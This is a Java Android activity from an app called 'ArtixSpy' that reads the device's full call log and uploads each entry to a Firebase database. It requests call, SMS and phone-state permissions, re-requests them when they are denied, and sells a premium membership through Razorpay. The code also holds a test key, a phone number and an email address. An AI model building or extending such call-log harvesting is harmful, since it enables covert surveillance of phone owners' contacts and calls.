package com.example.artixspy;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Patterns;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.razorpay.Checkout;
import com.razorpay.PaymentResultListener;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;


public class HomeAvc extends AppCompatActivity implements PaymentResultListener{
    private List<String > PermisionNeed = new ArrayList<>();

    private ArrayList<callLogModel> callLogModelArrayList;

    private CallLogAdapter callLogAdapter;
    private  String number,name,type,fulldate,date,time,duration,timeFormated;
    private SwipeRefreshLayout swipeRefreshLayout;
    private RecyclerView recyclerView;

    private static final int REQUEST_CODE = 999;
    String[] appPermission = {
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_SMS
    };

    private int flag = 0;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home_avc);



        Init();

        getSupportActionBar().setTitle("Call logs");
        for (String item: appPermission){
            if (ContextCompat.checkSelfPermission(this,item)!= PackageManager.PERMISSION_GRANTED)
            {
                PermisionNeed.add(item);
            }
        }
        if (PermisionNeed.isEmpty()){
            FetchCalllogs();

        }
        else if (!PermisionNeed.isEmpty()){
            reqper();
        }
        swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                swipeRefreshLayout.setRefreshing(true);
                if (PermisionNeed.isEmpty()){
                  FetchCalllogs();

                }
                else if (!PermisionNeed.isEmpty()){
                    reqper();
                }
                swipeRefreshLayout.setRefreshing(false);

            }
        });
        if(flag ==1){
            reqper();
        }



    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.main_manu, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        switch (item.getItemId()){
            case R.id.primium:
                //startActivity(new Intent(getApplicationContext(),Payment.class));
                callpayment();
            case R.id.registerd:
                startActivity(new Intent(getApplicationContext(),SmsActivity.class));

        }
        return super.onOptionsItemSelected(item);
    }

    private void callpayment() {

        String Smount ="100";

        int amount= Math.round(Float.parseFloat(Smount)*100);
        Checkout checkout =new Checkout();

        checkout.setKeyID("rzp_test_y6J2TsZitgI7Ib");

        checkout.setImage(R.mipmap.ic_launcher);

        JSONObject object =new JSONObject();
        try {
            object.put("Name", "ArtixSpy");
            object.put("Description", "This Is one time membership only ");
            object.put("theme.color", "#0093DD");
            object.put("currency", "INR");
            object.put("Amount", amount);
            object.put("prefill.contact", "+918617526343");
            object.put("pewfill.email", "somnathnath8482@gmail.com");

            checkout.open(HomeAvc.this,object);


        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    void reqper(){
        ActivityCompat.requestPermissions(this, PermisionNeed.toArray(new String[PermisionNeed.size()]), REQUEST_CODE);
    }


    private void Init() {


        swipeRefreshLayout = findViewById(R.id.swipe_refresh_layout);
        recyclerView = findViewById(R.id.main_rcv);
        recyclerView.setHasFixedSize(true);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        callLogModelArrayList = new ArrayList<>();
        callLogAdapter = new CallLogAdapter(this,callLogModelArrayList);
        recyclerView.setAdapter(callLogAdapter);


    }
    @RequiresApi(api= Build.VERSION_CODES.R)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE){
            int x= permissions.length;
            for (int i=0; i <= x-1; i++){
                if (grantResults[i]==PackageManager.PERMISSION_DENIED){
                    flag=1;
                    break;
                }
            }
            if (flag == 0){
               FetchCalllogs();

            }
            else if(flag ==1){
                ActivityCompat.requestPermissions(this, PermisionNeed.toArray(new String[PermisionNeed.size()]), REQUEST_CODE);
            }
        }


    }
public void FetchCalllogs()
    {
        Toast.makeText(this, "called", Toast.LENGTH_SHORT).show();
        String sortOrder = android.provider.CallLog.Calls.DATE+" DESC";
        Cursor cursor = this.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                sortOrder);
        callLogModelArrayList.clear();
        final DatabaseReference reference1 = FirebaseDatabase.getInstance().getReference("Data");
        final String uid = FirebaseAuth.getInstance().getCurrentUser().getUid();
        reference1.child(uid).removeValue();

        while(cursor.moveToNext()){
            number=cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            name=cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            name=name==null||name.equals("")?"Unknown":name;
            type=cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            fulldate=cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
            duration=cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
            SimpleDateFormat dateFormat= null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                dateFormat = new SimpleDateFormat("dd MM yyyy");
            }
            date=dateFormat.format(new Date(Long.parseLong(fulldate)));

            SimpleDateFormat timeformat=new SimpleDateFormat("HH:mm:ss");
            time=timeformat.format(new Date(Long.parseLong(fulldate)));

            timeFormated=getFormatedDateTime(time,"HH:mm:ss","hh:mm a");
            duration=durationformat(duration);

            switch(Integer.parseInt(type))
            {
                case CallLog.Calls.INCOMING_TYPE:
                    type="Incoming";
                    break;case CallLog.Calls.OUTGOING_TYPE:
                type="Outgoing";
                break;
                case CallLog.Calls.MISSED_TYPE:
                    type="Missed Call";
                    break;
                case CallLog.Calls.VOICEMAIL_TYPE:
                    type="Voicemail";
                    break;
                case CallLog.Calls.REJECTED_TYPE:
                    type="Rejected";
                    break;
                case CallLog.Calls.BLOCKED_TYPE:
                    type="Blocked";
                    break;
                case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                    type="Externaly Answered";
                    break;
                default :
                    type="NA";
                    break;
            }

            callLogModel callLogModel = new callLogModel(number,name,type,date,timeFormated,duration);
            //DatabaseReference reference1 = FirebaseDatabase.getInstance().getReference("Data");
            reference1.child(uid).child(date).push().setValue(callLogModel);


            callLogModelArrayList.add(callLogModel);



        }
        callLogAdapter.notifyDataSetChanged();
    }


    private String durationformat(String duration) {

        String durationFormatted = null;

        if (Integer.parseInt(duration)<60){
            durationFormatted = duration+"Sec";

        }
        else{
            int min = Integer.parseInt(duration)/60;
            int sec = Integer.parseInt(duration)%60;
            if (sec==0){
                durationFormatted = min+"min";
            }else
            {
                durationFormatted = min+" min "+ sec +" sec ";
            }
        }
        return durationFormatted;
    }


    private String getFormatedDateTime(String dateStr, String input, String output) {

        String formatted = dateStr;
        DateFormat inputFormat = new SimpleDateFormat(input, Locale.getDefault());
        DateFormat outputFormat = new SimpleDateFormat(output, Locale.getDefault());
        Date date = null;

        try {
            date = inputFormat.parse(dateStr);

        } catch (ParseException e) {
            e.printStackTrace();
        }
        if (date != null){
            formatted = outputFormat.format(date);
        }
        return formatted;

    }

    @Override
    public void onPaymentSuccess(String s) {
        AlertDialog.Builder builder =new AlertDialog.Builder(this);
        builder.setTitle("Payment Id");
        builder.setMessage("keep this id for future use "+s);
        builder.show();


    }

    @Override
    public void onPaymentError(int i, String s) {
        Toast.makeText(this, "Transaction Failed", Toast.LENGTH_SHORT).show();

    }
}